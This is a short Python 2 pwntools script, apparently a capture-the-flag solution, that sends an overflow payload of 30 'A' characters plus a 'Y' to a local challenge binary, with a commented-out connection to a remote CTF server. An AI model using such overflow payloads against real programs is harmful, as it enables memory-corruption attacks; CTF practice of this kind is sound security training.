from pwn import *
payload = 'A'*30+'Y'
#+'A'*28+'B'*4

#for i in range(1,100):    
    #p = remote('hack.bckdr.in',12071)
p = process('./chall')
print p.recv()
p.sendline(payload)
print p.recvall()
p.close()

